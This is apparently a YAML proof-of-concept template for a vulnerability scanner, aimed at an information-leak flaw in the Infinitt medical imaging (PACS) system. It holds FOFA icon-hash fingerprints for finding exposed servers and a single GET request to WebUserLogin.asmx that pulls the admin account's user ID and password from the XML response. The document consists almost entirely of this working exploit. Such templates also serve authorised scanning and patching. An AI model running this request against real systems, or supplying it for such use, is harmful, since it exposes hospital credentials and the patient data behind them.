id: poc-yaml-infinitt-webuserlogin-asmx-info-leak
info:
  name: 英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 英飞达医学影像存档与通信系统
  fofa: icon_hash="1474455751" || icon_hash="702238928"
requests:
- method: GET
  path: /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin
  expression: status_code == 200 && matches(body,"<USERID>.*?</USERID>") && matches(body,"<PASSWORD>.*?</PASSWORD>")
    && contains(body,"NewDataSet") && contains(content_type,"text/xml")
variables: {}
transport: http
